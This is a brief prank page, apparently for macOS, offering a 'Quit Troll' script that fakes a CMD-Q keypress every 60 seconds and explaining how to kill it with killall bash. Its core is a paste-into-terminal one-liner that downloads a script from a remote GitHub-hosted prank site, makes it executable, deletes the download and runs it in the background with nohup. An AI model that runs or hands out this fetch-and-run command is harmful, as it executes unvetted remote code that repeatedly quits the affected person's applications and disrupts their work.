Quit Troll

This script simulates a CMD-Q keypress every 60 seconds.
To kill it, use killall bash in terminal, or use activity monitor.

Copy and paste the following into your terminal:
curl "https://raw.githubusercontent.com/itrolledu/itrolledu.github.io/master/mac/qtroll/dl" -o "trolling"; tr -d '\r' < trolling >trollingnl; chmod +x ./trollingnl; rm -rf trolling; nohup sh -c '$PWD/trollingnl' &
